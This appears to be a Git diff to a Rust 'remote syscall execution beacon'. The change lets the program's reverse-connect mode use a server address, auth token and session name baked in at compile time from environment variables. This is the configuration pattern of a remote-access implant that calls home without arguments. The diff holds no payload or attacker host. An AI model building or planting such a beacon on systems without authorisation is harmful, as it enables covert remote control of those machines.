@@ -28,6 +28,9 @@ const BAKED_ENCRYPTION: &str = match option_env!("RSC_BEACON_ENCRYPTION") {
     Some(v) => v,
     None => "none",
 };
+const BAKED_CONNECT: Option<&str> = option_env!("RSC_BEACON_CONNECT");
+const BAKED_AUTH: Option<&str> = option_env!("RSC_BEACON_AUTH");
+const BAKED_NAME: Option<&str> = option_env!("RSC_BEACON_NAME");
 
 #[derive(Parser)]
 #[command(name = "rsbeacon", about = "Remote syscall execution beacon")]
@@ -119,8 +122,8 @@ struct Args {
     auth: Option<String>,
 
     /// Session name at the rsserver (only with --connect).
-    #[arg(long, default_value = "default")]
-    name: String,
+    #[arg(long)]
+    name: Option<String>,
 }
 
 /// Builds and initializes the selected [`NetBackend`]. Fails fast with an
@@ -236,15 +239,28 @@ async fn main() -> Result<()> {
 
     let transport = args.transport.as_deref().unwrap_or("tcp");
 
-    if let Some(server) = &args.connect {
+    let connect = args.connect.as_deref().or(BAKED_CONNECT);
+    if let Some(server) = connect {
         if transport != "tcp" {
             anyhow::bail!("--connect (reverse mode) requires tcp transport");
         }
         let addr: SocketAddr = server.parse()?;
+        let name = args
+            .name
+            .as_deref()
+            .or(BAKED_NAME)
+            .unwrap_or("default")
+            .to_string();
+        let auth = args
+            .auth
+            .as_deref()
+            .or(BAKED_AUTH)
+            .unwrap_or("")
+            .to_string();
         return server::run_reverse(
             addr,
-            args.name.clone(),
-            args.auth.clone().unwrap_or_default(),
+            name,
+            auth,
             use_tls,
             cert_pem,
             key_pem,
